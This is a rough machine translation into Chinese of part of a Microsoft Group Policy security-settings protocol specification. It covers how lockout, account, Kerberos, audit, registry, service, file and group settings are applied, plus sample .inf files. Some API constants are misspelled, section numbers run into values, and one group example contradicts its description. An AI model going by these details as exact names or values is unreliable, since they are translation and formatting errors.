必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainLockOutInformation。\n§ PSAMPR_DOMAIN_INFO_BUFFER必须是指向PSAMPR_DOMAIN_INFO_BUFFER的指针，该指针包含足够包含SAMPR_DOMAIN_LOCKOUT_INFORMATION结构的已分配内存([MS-SAMR]节2.2.3.15)。\n\\2. 执行与本地调用SamrSetInformationDomain一致的外部行为([MS-SAMR]第3.1.5.6.1节）。\n§ 必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainLockOutInformation。\n§ DomainInformation必须是包含sampr_domain_info_buffer结构的psampr_domain_lockout_information。客户端插件必须根据以下规则中的映射，将GPO inf文件中指定的每个帐户锁定策略值设置为SAMPR_DOMAIN_LOCKOUT_INFORMATION结构成员：\n对于LockoutBadCount设置，客户端管理单元必须将SAMPR_DOMAIN_LOCKOUT_INFORMATION结构LockoutThreshold成员设置为设置值。\n对于ResetLockCount设置，客户端管理单元必须将SAMPR_DOMAIN_LOCKOUT_INFORMATION结构LockoutObservationWindow成员设置为下表右侧列中指定的转换所产生的值。\nResetLockCount value DOMAIN_LOCKOUT_INFORMATION LockoutObservationWindow member value X (any value) -1X60 * 10000000 对于LockoutDuration设置，客户端管理单元必须将GPO inf文件中的设置值映射到下表左侧列中的值之一，并将SAMPR_DOMAIN_LOCKOUT_INFORMATION结构LockoutDuration成员设置为下表相应右侧列中指定的转换所产生的值。\nLockoutDuration value持续时间值 DOMAIN_LOCKOUT_INFORMATION LockoutDuration member value -1 0x8000000000000000 X (any value 1 to 99,999) -1X60 * 10000000 如果密钥名称为“forcelogoffwhenhourexpire”：\n\\1. 执行与本地调用SamrQueryInformationDomain([MS-SAMR]节3.1.5.5.2)一致的外部行为，以获得现有的域帐户注销信息。\n§ 必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainLogoFFInformation。\n§ PSAMPR_DOMAIN_INFO_BUFFER必须是指向PSAMPR_DOMAIN_INFO_BUFFER的指针，该指针包含足够包含DOMAIN_LOGOFF_INFORMATION([MS-SAMR]节2.2.3.6)结构的已分配内存。\n\\2. 执行与本地调用SamrSetInformationDomain一致的外部行为([MS-SAMR]第3.1.5.6.1节）。\n§ 必须将DomainHandle设置为通过执行与本地调用SamrOpenDomain一致的外部行为打开的域句柄([MS-SAMR]节3.1.5.1.5)，以获得当前计算机的域句柄。\n§ 必须将DomainInformationClass设置为DomainLogoFFInformation。\nDomainInformation必须是包含DOMAIN_LOGOFF_INFORMATION结构的PSAMPR_DOMAIN_INFO_BUFFER。客户端插件必须将FORCELOGOFFWHOUREXPIRE设置值与下表左侧列中的值之一匹配，并将DOMAIN_LOGOFF_INFORMATION结构成员设置为下表右侧列中的相应值。\nForceLogoffWhenHourExpire value按小时为单位过期时强制注销值 DOMAIN_LOGOFF_INFORMATION ForceLogoff member value 1 0 0 0x8000000000000000 3.2.5.3 本地帐户策略 通过执行以下操作来设置本地帐户策略：\n如果键值是2.2.1.3节中表中列出的有效值以外的任何值，则应记录错误，客户端应停止处理本地帐户策略并记录错误。\n如果“value”元素的值对于2.2.1.3节中表中指定的相应键值无效，则应记录错误，客户端必须停止处理本地帐户策略。\n如果密钥名称为“LSAAnonymousNameLookup”：\n\\1. 执行与本地调用LsarQuerySecurityObject一致的外部行为([MS-LSAD]第3.1.4.9.1节）。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy([MS-LSAD]节3.1.4.4.2)一致的外部行为打开的策略句柄，并且将DesiredAccess设置为maximum_alloved([MS-LSAD]节2.2.1.1.1)。\n§ 必须将SecurityInformation设置为DACL_SECURITY_INFORMATION([MS-LSAD]section 2.2.1.3)。\n§ 必须将SecurityDescriptor设置为PLSAR_SR_SECURITY_DESCRIPTOR变量的地址。\n\\2. 执行与本地调用LSarsetSecurityObject一致的外部行为。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy([MS-LSAD]节3.1.4.4.2)一致的外部行为打开的策略句柄，并且将DesiredAccess设置为maximum_alloved([MS-LSAD]节2.2.1.1.1)。\n§ 必须将SecurityInformation设置为DACL_SECURITY_INFORMATION([MS-LSAD]section 2.2.1.3)。\n§ SecurityDescriptor必须是一个指向LSAR_SR_SECURITY_DESCRIPTOR结构的指针，在该结构中，DACL([MS-DTYP]节2.4.5)必须被设置为步骤1中从LsarQuerySecurityObject方法接收的DACL，其中添加了一个ACCESS_ALLOWED_ACE([MS-DTYP]节2.4.4.2)授予匿名SID([MS-DTYP]节2.4.2.4)一个设置为POLICY_LOOKUP_NAMES([MS-LSAD]节2.2.1.1.2)的访问掩码。\n如果密钥名称为“EnableAdminAccount”：\n\\1. 执行与本地调用SamrQueryInformationUser一致的外部行为([MS-SAMR]节3.1.5.5.6)。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser一致的外部行为([MS-SAMR]section 3.1.5.1.9)获得的用户句柄，使用以下参数：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_ADMIN的UserId参数([MS-SAMR]节2.2.1.14)。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserControlInformation([MS-SAMR]section 2.2.6.28)。\n§ 缓冲区必须设置为足够大的内存缓冲区的地址，以包含SAMPR_USER_INFO_BUFFER结构([MS-SAMR]节2.2.6.29)。\n\\2. 执行与本地调用SamrSetInformationUser一致的外部行为([MS-SAMR]第3.1.5.6.5节）。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser一致的外部行为([MS-SAMR]section 3.1.5.1.9)获得的用户句柄，使用以下参数：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_ADMIN的UserId参数([MS-SAMR]节2.2.1.14)。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserControlInformation([MS-SAMR]section 2.2.6.28)。\n缓冲区必须设置为SAMPR_USER_INFO_BUFFER结构的地址，该结构的控制成员变量根据下表设置\nEnableAdminAccount setting value SAMPR_USER_INFO_BUFFER Control member value 1 (Enable Admin Account) 在步骤1和0xFFFFFFFE中接收的控制值的按位AND 0 (Disable Admin Account) 在步骤1和USER_ACCOUNT_DISABLED([MS-SAMR]节3.1.5.14.2)中接收的控制值的按位OR。 如果密钥名称为“EnableGuestAccount”：\n\\1. 执行与本地调用SamrQueryInformationUser一致的外部行为([MS-SAMR]节3.1.5.5.6)。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser一致的外部行为([MS-SAMR]section 3.1.5.1.9)获得的用户句柄，使用以下参数：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_GUEST([MS-SAMR]节2.2.1.14)的UserId参数。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserControlInformation([MS-SAMR]section 2.2.6.28)。\n§ 缓冲区必须设置为足够大的内存缓冲区的地址，以包含SAMPR_USER_INFO_BUFFER结构([MS-SAMR]节2.2.6.29)。\n\\2. 执行与本地调用SamrSetInformationUser一致的外部行为([MS-SAMR]第3.1.5.6.5节）。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser一致的外部行为([MS-SAMR]section 3.1.5.1.9)获得的用户句柄，使用以下参数：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_GUEST([MS-SAMR]节2.2.1.14)的UserId参数。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserControlInformation([MS-SAMR]section 2.2.6.28)。\n§ 缓冲区必须设置为SAMPR_USER_INFO_BUFFER结构的地址，该结构的控制成员变量根据下表设置。\nEnableGuestAccount setting value SAMPR_USER_INFO_BUFFER Control member value 1 (Enable Guest Account) 在步骤1和0xFFFFFFFE中接收的控制值的按位AND 0 (Disable Guest Account) 在步骤1和USER_ACCOUNT_DISABLED中接收的控制值的按位或([MS-SAMR]节3.1.5.14.2) 如果密钥名称为“newadministratorname”：\n执行与本地调用SamrSetInformationUser一致的外部行为([MS-SAMR]第3.1.5.6.5节）。如果SamrSetInformationUser返回错误，则组策略：安全协议扩展客户端必须停止处理本地帐户策略并记录错误。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser([MS-SAMR]section 3.1.5.1.9)一致的外部行为获得的用户句柄，参数值如下：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_ADMIN的UserId参数([MS-SAMR]节2.2.1.14)。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserNameInformation([MS-SAMR]section 2.2.6.28)。\n§ 缓冲区必须设置为SAMPR_USER_NAME_INFORMATION结构的地址，该结构的UserName成员变量设置为NewAdministratorName设置的值。\n如果密钥名称为“NewGuestName”：\n执行与本地调用SamrSetInformationUser一致的外部行为([MS-SAMR]第3.1.5.6.5节）。如果SamrSetInformationUser返回错误，GPSB客户端必须停止处理本地帐户策略并记录错误。\n§ UserHandle必须设置为通过执行与本地调用SamrOpenUser([MS-SAMR]section 3.1.5.1.9)一致的外部行为获得的用户句柄，参数值如下：\n§ Maximum_Allowed的DesiredAccess参数。\n§ DOMAIN_USER_RID_GUEST([MS-SAMR]节2.2.1.14)的UserId参数。\n§ DomainHandle参数，设置为当前计算机的域的句柄，通过执行与本地调用SamrOpenDomain一致的外部行为([MS-SAMR]节3.1.5.1.5)获得。\n§ 必须将UserInformationClass设置为UserNameInformation([MS-SAMR]section 2.2.6.28)。\n§ 缓冲区必须设置为SAMPR_USER_NAME_INFORMATION结构的地址，该结构的UserName成员变量设置为NewGuestName设置的值。\n3.2.5.4 Kerberos策略 如果键值是2.2.2节中表中列出的有效值以外的任何值，客户端必须停止处理Kerberos策略设置并记录错误。\n必须通过执行与本地调用LsarQueryDomainInformationPolicy一致的外部行为来检索现有的Kerberos策略([MS-LSAD]节3.1.4.4.7)。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy([MS-LSAD]节3.1.4.4.2)一致的外部行为打开的策略句柄，并且将DesiredAccess设置为maximum_alloved([MS-LSAD]节2.2.1.1.1)。\n§ InformationClass必须设置为PolicyDomainKerberosTicketInformation([MS-LSAD]section 2.2.4.15)。\n接下来，必须通过执行与本地调用LsarSetDomainInformationPolicy一致的外部行为([MS-LSAD]第3.1.4.4.8)来使用Kerberos policy中的设置（第2.2.2)更新现有的Kerberos policy。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy([MS-LSAD]节3.1.4.4.2)一致的外部行为打开的策略句柄，并且将DesiredAccess设置为maximum_alloved([MS-LSAD]节2.2.1.1.1)。\n§ InformationClass必须设置为PolicyDomainKerberosTicketInformation([MS-LSAD]section 2.2.4.15)。\n§ 必须将PolicyDomainInformation设置为通过查询现有Kerberos策略返回的POLICY_DOMAIN_KERBEROS_TICKET_INFO结构，并使用以下映射表进行更新。右列中的POLICY_DOMAIN_KERBEROS_TICKET_INFO结构的每个元素与Kerberos策略中的设置一起被设置为分配给左列中相应键的值。如果TicketValidateClient设置设置为“true”，则必须设置AuthenticationOptions位POLICY_KERBEROS_VALIDATE_CLIENT。\nGroup Policy: Security Protocol Extension LSAD POLICY_DOMAIN_KERBEROS_TICKET_INFO structure MaxServiceAge MaxServiceTicketAge MaxTicketAge MaxTicketAge MaxRenewAge MaxRenewAge MaxClockSkew MaxClockSkew TicketValidateClient AuthenticationOptions bit POLICY_KERBEROS_VALIDATE_CLIENT 3.2.5.5 事件日志策略 如果键值是2.2.3节中表中列出的有效值以外的任何值，客户端应停止处理事件日志策略设置并记录错误。\n事件日志策略中的设置（第2.2.3)映射到[MS-EVEN]第3.1.1.2节中指定的抽象数据模型，使用日志名（与头值相同）（第2.2.3节）来确定要更新其值的注册表项：\nLog Name Registry Key System Log HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\eventlog\\System Security Log HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\eventlog\\Security Application Log HKEY_LOCAL_MACHINE\\system\\currentcontrolset\\services\\eventlog\\Application 下表右列中的注册表值被设置为事件日志策略（第2.2.3节）设置中指定的左列项的值。\nGroup Policy: Security Protocol Extension EventLog Remoting Protocol MaximumLogSize MaxSize AuditLogRetentionPeriodRetentionDays（保留日） 保留：§ AuditLogRetentionPeriod为“0”：0§ AuditLogRetentionPeriod为“1”：RetentionDays值转换为秒§ AuditLogRetentionPeriod为“2”：0xFFFFFFF RestrictGuestAccess RestrictGuestAccess 3.2.5.6 事件审核策略 如果DWORD注册表值Machine\\System\\CurrentControlSet\\Control\\LSA\\ScenoApplyLegacyAuditPolicy使用第2.2.5节中描述的机制设置为1，则客户端插件必须忽略事件审核策略部分中的任何设置，并且不得处理这些设置。如果此注册表值设置为1，则表示客户端上存在高级审核策略。\u003c10\u003e\n关键元素的值必须是第2.2.4节中表中规定的值之一；否则，客户端必须记录错误并停止处理事件审核策略。值元素必须是整数；否则，客户端将记录错误并停止处理事件审核策略。\n事件审核策略（第2.2.4)中的设置必须通过执行与本地调用LsarSetInformationPolicy（第3.1.4.4.6节）一致的外部行为来设置([MS-LSAD]第3.1.4.4.6节）。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy一致的外部行为打开的策略句柄（第3.1.4.4.2节）([MS-LSAD]第3.1.4.4.2节）。\n§ InformationClass必须设置为PolicyAuditEventsInformation。\n§ 缓冲区必须使用事件审核策略中的设置来设置，其中键映射到枚举([MS-LSAD]节2.2.4.20)，如下表所示。\nGroup Policy: Security Protocol Extension Local Security Authority (Domain Policy) Remote Protocol本地安全授权（域策略）远程协议 AuditAccountManage AuditCategoryAccountManagement AuditDSAccess AuditCategoryDirectoryServiceAccess AuditAccountLogon AuditCategoryAccountLogon AuditLogonEvents AuditCategoryLogon AuditObjectAccess AuditCategoryObjectAccess AuditPolicyChange AuditCategoryPolicyChange AuditPrivilegeUse AuditCategoryPrivilegeUse AuditProcessTracking AuditCategoryDetailedTracking AuditSystemEvents AuditCategorySystem 此外，根据下表，每个设置的值（节2.2.4)映射到EventAuditingOptions数组([MS-LSAD]节2.2.4.4)的值。如果值的两个低阶位中的任何一个被设置，则根据这些位表示的值映射该值。否则，这些值将映射到policy_audit_event_none。\nGroup Policy: Security Protocol Extension Local Security Authority (Domain Policy) Remote Protocol本地安全授权（域策略）远程协议 0 POLICY_AUDIT_EVENT_NONE 1 POLICY_AUDIT_EVENT_SUCCESS | POLICY_AUDIT_EVENT_NONE 2 POLICY_AUDIT_EVENT_FAILURE | POLICY_AUDIT_EVENT_NONE 3 POLICY_AUDIT_EVENT_SUCCESS | POLICY_AUDIT_EVENT_FAILURE |POLICY_AUDIT_EVENT_NONE 4 POLICY_AUDIT_EVENT_NONE 3.2.5.7 注册表值 注册表值（第2.2.5节）中的设置必须通过添加注册表值来设置。\n如果键值是2.2.5节中表中列出的有效值以外的任何值，则应记录错误，客户端必须停止处理注册表值设置。\n注册表值必须通过执行与本地调用BaseRegSetValue（节3.1.5.22)([MS-RRP]节3.1.5.22)一致的外部行为来添加。\n§ 必须将hKey设置为通过执行与本地调用BaseRegCreateKey（第3.1.5.7节）([MS-RRP]第3.1.5.7节）一致的外部行为打开的注册表项句柄，使用上次“\\”之前设置的RegistryValueName部分。\n§ lpValueName必须设置为设置的RegistryValueName的最后一部分，位于最后一个’'之后。\n§ 必须将dwType设置为该设置的RegistryValueType。\n§ 必须将lpData设置为该设置的RegistryValue。\ncbData必须设置为设置的RegistryValue的长度（以字节为单位）。\n3.2.5.8 特权权利 特权权限（第2.2.6节）中的设置必须通过添加特权权限来设置。\n如果一个设置或值不符合2.2.6节中规定的有效对应值，客户端应停止处理特权权限设置。\n通过对RightName设置中的每个SidEnt执行与本地调用LsarAddAccountRights([MS-LSAD]节3.1.4.5.11)一致的外部行为来添加特权权限。\n§ 必须将PolicyHandle设置为通过执行与本地调用LsarOpenPolicy一致的外部行为打开的策略句柄([MS-LSAD]节3.1.4.4.2)。\n§ 对于该设置，AccountSid必须设置为SidEnt的值。\n§ UserRights必须设置为LSAPR_USER_RIGHT_SET结构的地址值，其中UserRights成员必须设置为PRPC_UNICODE_STRING元素数组，其中包含一个设置为RightName值的元素（如[MS-LSAD]节2.2.5.3中所指定）。LSAPR_USER_RIGHT_SET条目成员必须设置为一。RightName字符串必须分别与[MS-LSAD]第3.1.1.2.1和3.1.1.2.2节中列出的有效特权或用户权限的名称相对应。\n3.2.5.9 注册表项 写入注册表项和值的行为在[MS-RRP]第4.2节中指定。\n如果RegistryKeyName、ACLString或PermPropagationMode值不是2.2.7节中指定的有效值，客户端应停止处理注册表项设置并记录错误。\n注册表项中的设置（第2.2.7节）必须通过对每个设置的注册表项应用安全描述符来设置。\n通过执行与本地调用BaseRegGetKeySecurity一致的外部行为（第3.1.5.13节）([MS-RRP]第3.1.5.13节）从注册表项读取安全描述符。\n§ 必须将hKey设置为通过执行与使用注册表对象的RegistryKeyName本地调用BaseRegOpenKey（节3.1.5.15)([MS-RRP]节3.1.5.15)一致的外部行为打开的注册表项句柄。\n§ SecurityInformation必须设置为OWNER_SECURITY_INFORMATION GROUP_SECURITY_INFORMATION DACL_SECURITY_INFORMATION SACL_SECURITY_INFORMATION([MS-RRP]节2.2.9)。\n通过执行与本地调用BaseRegSetKeySecurity一致的外部行为（第3.1.5.21节）([MS-RRP]第3.1.5.21节），将安全描述符应用于注册表项。\n§ 必须将hKey设置为通过执行与使用注册表对象的RegistryKeyName本地调用BaseRegOpenKey（节3.1.5.15)([MS-RRP]节3.1.5.15)一致的外部行为打开的注册表项句柄。\n§ SecurityInformation必须设置为OWNER_SECURITY_INFORMATION GROUP_SECURITY_INFORMATION DACL_SECURITY_INFORMATION SACL_SECURITY_INFORMATION([MS-RRP]节2.2.9)。\n§ pRpcSecurityDescriptor必须以RPC_SECURITY_DESCRIPTOR（节2.2.8)([MS-RRP]节2.2.8)的形式设置为“ACLString”设置中提供的安全描述符。\n安全描述符应用于对应于每个设置的每个注册表对象的注册表项。\n如果PermPropagationMode为“0”，则通过调用CreateSecurityDescriptor（第2.5.3.4.1节）([MS-DTYP]第2.5.3.4.1节）并将生成的安全描述符应用于注册表对象，递归更新每个子注册表对象的安全描述符，以允许可继承权限的传播。调用CreateSecurityDescriptor时使用以下参数：\n§ ParentDescriptor**设置为注册表对象父级的安全描述符。\n§ CreatorDescriptor设置为注册表对象的当前安全描述符。\n§ IsContainerObject设置为true*。*\n§ ObjectTypes设置为NULL*。*\n§ AutoInheritFlags设置为dacl_auto_inheritage sacl_auto_inheritage DEFAULT_OWNER_FROM_PARENT default_group_fromparent*。*\n§ 令牌是包含S-1-5-18（本地系统众所周知的SID）的令牌。\n§ GenericMapping**是注册表对象的泛型映射。\n如果PermPropagationMode为“1”，则通过调用CreateSecurityDescriptor（第2.5.3.4.1节）([MS-DTYP]第2.5.3.4.1节）并将生成的安全描述符应用于注册表对象，递归更新每个子注册表对象的安全描述符，以允许可继承权限的传播。调用CreateSecurityDescriptor时使用以下参数：\n§ ParentDescriptor**设置为注册表对象父级的安全描述符。\n§ CreatorDescriptor设置为NULL*。*\n§ IsContainerObject设置为true*。*\n§ ObjectTypes设置为NULL*。*\n§ AutoInheritFlags设置为dacl_auto_inheritage sacl_auto_inheritage DEFAULT_OWNER_FROM_PARENT default_group_fromparent。\n§ 令牌是包含S-1-5-18（本地系统众所周知的SID）的令牌。\n§ GenericMapping**是注册表对象的泛型映射。\n如果PermPropagationMode为“2”，则该设置的注册表对象上的安全描述符控制字段位PD([MS-DTYP]节2.4.6)将设置为0。\n3.2.5.10 服务常规设置 服务常规设置（第2.2.8节）中的设置必须通过对每个设置应用服务的启动配置和安全描述符来设置。\n如果ServiceName、StartupMode或AclString值不是2.2.8节中指定的有效值，客户端将停止处理服务常规设置并记录错误。\n启动配置必须通过对每个设置执行与本地调用RChangeServiceConfigW（[MS-SCMR]节3.1.4.11)一致的外部行为来应用于服务。\n§ 必须使用设置的ServiceName执行与本地调用ROpenServiceW([MS-SCMR]节3.1.4.16)一致的外部行为，将hService设置为打开的服务句柄。\n§ 必须将dwServiceType设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索的服务类型([MS-SCMR]节3.1.4.17)。\n§ dwStartType必须设置为服务中设置的StartupMode常规设置，其中StartupMode映射到dwStartType([MS-SCMR]节2.2.15)，如下表所示。\nGroup Policy: Security Protocol Extension Service Control Manager Remote Protocol服务控制管理器远程协议 Value of “2” SERVICE_AUTO_START ([MS-SCMR] section 2.2.15) Value of “3” SERVICE_DEMAND_START ([MS-SCMR] section 2.2.15) Value of “4” SERVICE_DISABLED ([MS-SCMR] section 2.2.15) § dwErrorControl必须设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索的错误控制([MS-SCMR]节3.1.4.17)。\n§ 必须将lpBinaryPathName设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索的路径名([MS-SCMR]节3.1.4.17)。\n§ lpLoadOrderGroup必须设置为服务组，以便通过执行与本地调用RQueryServiceConfigW一致的外部行为来检索加载顺序([MS-SCMR]节3.1.4.17)。\n§ lpdwTagId必须设置为NULL。\n§ 必须将lpDependencies设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索的依赖项([MS-SCMR]节3.1.4.17)。\n§ 必须将dwDependSize设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索到的依赖项数([MS-SCMR]节3.1.4.17)。\n§ 必须将lpServiceStartName设置为Null。\n§ lpPassword必须设置为NULL。\n§ dwPwSize必须设置为0。\n§ 必须将lpDisplayName设置为通过执行与本地调用RQueryServiceConfigW一致的外部行为检索的显示名称([MS-SCMR]节3.1.4.17)。\n必须通过对每个设置执行与本地调用RSetServiceObjectSecurity([MS-SCMR]节3.1.4.6)一致的外部行为，将安全描述符应用于服务。\n§ 必须将hService设置为通过执行与使用设置的ServiceName本地调用ROpenServiceW([MS-SCMR]节3.1.4.16)一致的外部行为打开的服务句柄。\n§ dwSecurityInformation必须设置为DACL_SECURITY_INFORMATION([MS-SCMR]节2.2.1。\n§ lpSecurityDescriptor必须按照[MS-DTYP]第2.4.6节中指定的形式设置为设置的AclString中的安全描述符。\ncbBufSize必须设置为lpSecurityDescriptor参数指向的缓冲区的大小（以字节为单位）。\n3.2.5.11 文件安全 必须通过为每个设置应用安全描述符、传播模式和安全描述符（AclString）来设置每个文件安全设置。\n如果FileOrDirectoryPath、PermPropagationMode或AclString值不是2.2.9节中指定的有效值，客户端应停止处理文件安全设置并记录错误。\n文件或子目录上的安全描述符应通过执行与本地调用应用程序请求应用文件安全“任务([MS-SMB2]节3.2.4.13)一致的外部行为来应用，并使用以下参数：\n§ 必须使用设置的FileOrDirectoryPath将Open设置为通过执行与本地调用“Application Requests Opening a File”任务([MS-SMB2]节3.2.4.3)一致的外部行为返回的Open。\n§ 必须将安全信息设置为“ACLString”设置中提供的安全描述符。此安全描述符使用[MS-DTYP]节2.4.6中指定的自相关形式。\n§ 安全属性必须设置为DACL_SECURITY_INFORMATION([MS-SMB2]section 2.2.39)。\n应该通过执行与本地调用“Application Requests Quering file security”任务([MS-SMB2]节3.2.4.12)一致的外部行为来查询文件或子目录上的安全描述符，并使用以下参数：\n§ 必须使用设置的FileOrDirectoryPath将Open设置为通过执行与本地调用“Application Requests Opening a File”任务([MS-SMB2]节3.2.4.3)一致的外部行为返回的Open。\n§ 安全属性必须设置为DACL_SECURITY_INFORMATION([MS-SMB2]section 2.2.39)。\n如果PermPropagationMode为“0”，则应通过调用CreateSecurityDescriptor([MS-DTYP]节2.5.3.4.1)并对每个相应的子文件对象应用结果安全描述符，递归更新每个子文件对象的安全描述符，以允许传播可继承的权限。调用CreateSecurityDescriptor时使用以下参数：\n§ ParentDescriptor**设置为文件对象父级的安全描述符。\n§ CreatorDescriptor**设置为文件对象的当前安全描述符。\n§ IsContainerObject设置为true*。*\n§ ObjectTypes设置为NULL*。*\n§ AutoInheritFlags设置为DACL_AUTO_INHERIT Default_OWNER_FROM_PARTER Default_GROUP_FROMPARTER。\n§ 令牌是包含S-1-5-18（本地系统众所周知的SID）的令牌。\n§ GenericMapping**是文件对象的泛型映射。\n如果PermPropagationMode为“1”，则应通过调用CreateSecurityDescriptor([MS-DTYP]节2.5.3.4.1)并对每个相应的子文件对象应用结果安全描述符，递归更新每个子文件对象的安全描述符，以允许传播可继承的权限。调用CreateSecurityDescriptor时使用以下参数：\n§ ParentDescriptor**设置为文件对象父级的安全描述符。\n§ CreatorDescriptor设置为NULL*。*\n§ IsContainerObject设置为true*。*\n§ ObjectTypes设置为NULL*。*\n§ AutoInheritFlags设置为DACL_AUTO_INHERIT Default_OWNER_FROM_PARTER Default_GROUP_FROMPARTER。\n§ 令牌是包含S-1-5-18（本地系统众所周知的SID）的令牌。\n§ GenericMapping**是文件对象的泛型映射。\n如果PermPropagationMode为“2”，则该设置的file对象上的安全描述符控制字段位PD设置为零。\n3.2.5.12 组成员资格 组成员资格中的设置必须通过为每个设置在组上应用成员和成员资格来设置。\n如果GroupNameMembers、GroupNameMemberOf或Value元素值如第2.2.10节所述无效，客户端必须停止处理组成员资格设置并记录错误。\n如果设置的键（第2.2.10节）指定的组是域本地、全局或通用组，则：\n§ 对于设置的值（节2.2.10)中的域本地、全局和通用组，成员和成员资格必须通过执行与本地调用“在ADConnection上执行LDAP操作”任务([MS-ADTS]节7.6.1.6)一致的外部行为来应用，并为设置中的值（节2.2.10)中的每个SID或名称使用以下参数：\n§ TASKINPUTADConnection：一个基于客户机域名的ADConnection句柄([MS-DTYP]section 2.2.2)。\n§ TaskinPutreQuestMessage：LDAP修改请求([RFC2251]section 4.6)，如下所示：\n§ 对象：由设置的键（第2.2.10节）指定的组的可分辨名称。\n§ 修改序列有一个条目，如下所示：\n§ 操作：添加。\n§ 修改：\n§ 类型：member或MemberOf。\n§ vals**：由设置的值（第2.2.10节）中的SID或名称指定的对象的可分辨名称。**\n§ 对于设置的值（节2.2.10)中的本地组，必须通过执行与本地调用SamrAddMemberToGroup([MS-SAMR]节3.1.5.8.1)一致的外部行为来应用成员资格，该行为适用于设置中的值（节2.2.10)中的每个SID或名称：\n§ GroupHandle必须通过执行与本地调用SamroPengGroup([MS-SAMR]节3.1.5.1.7)一致的外部行为来设置为GroupHandle，使用由设置的值（节2.2.10)指定的组的相对标识符(RID)。\n§ 必须将MemberId设置为该设置的键（第2.2.10节）中的SID或名称指定的对象的RID。\n§ 属性必须设置为零。\n如果设置的键（节2.2.10)指定的组是本地组，则必须通过执行与本地调用SamrAddMemberToGroup([MS-SAMR]节3.1.5.8.1)一致的外部行为来应用成员，该行为针对设置中的值（节2.2.10)中的每个SID或名称：\n§ 必须将GroupHandle设置为通过执行与本地调用SamroPengGroup([MS-SAMR]节3.1.5.1.7)一致的外部行为打开的组句柄，使用设置的键（节2.2.10)指定的组的RID。\n§ 必须将MemberId设置为该设置的值（第2.2.10节）中的SID或名称指定的对象的RID。\n属性必须设置为零。\n3.2.5.13 用户帐户控制 用户帐户控制（第2.2.11节）中的设置必须通过为每个设置值元组（键、值、类型、数据）添加注册表值来设置。如果键、值、类型和数据值不符合2.2.11节中指定的有效用户帐户控制设置值元组之一，客户端应退出处理用户帐户控制设置并记录错误。\n用户帐户控制设置按第3.2.5.6节的规定处理，其中：\n§ RegistryValueName是带有反斜杠的指定键值，并附加了指定的value元素值。\n§ RegistryValueType是类型值。\nRegistryValue是数据值。\n3.2.6 定时器事件 3.2.7 其他本地活动 4 协议示例 4.1 涉及密码策略的示例 在下面的示例中，管理员指定，对于应用特定GPO的计算机，将强制执行指定的密码策略：\n§ 密码长度最小为8个字符。\n§ 打开密码复杂性检查。\n§ 10个密码的密码历史是要记住和强制执行的。\n[Unicode] Unicode=yes [Version] signature=\"$CHICAGO$\" Revision=1 [System Access] MinimumPasswordLength = 8 PasswordComplexity = 1 PasswordHistorySize = 104.2 涉及审核设置的示例 在下面的示例中，管理员指定为应用特定GPO的计算机应用指定的审核设置：\n\\1. 审核成功尝试登录帐户。\n\\2. 审核帐户管理失败的尝试。\n\\3. 对对象访问进行了成功和失败的审核尝试。\n\\4. 审核成功和失败的过程跟踪尝试。\n[Unicode] Unicode=yes [Version] signature=\"$CHICAGO$\" Revision=1 [Event Audit] AuditObjectAccess = 3 AuditAccountManage = 2 AuditProcessTracking = 3 AuditAccountLogon = 14.3 配置组成员身份的示例 在下面的示例中，管理员指定，对于应用特定GPO的计算机，组成员资格配置为已分配：\n\\1. Group1包含以下成员:member1、member2和Member3。\n\\2. Group2包含以下成员:member1和member3。\n\\3. Group3包含以下成员:Member4。\n\\4. Group1是Group3的一部分。\n\\5. Group2是Group1的一部分。\n[Unicode] Unicode=yes [Version] signature=\"$CHICAGO$\" Revision=1 [Group Membership] Group1__Memberof = Group3 Group1__Members = member3,member2,member1 Group2__Memberof = Group3 Group2__Members = member3,member1 Group3__Memberof = Group3__Members = member44.4 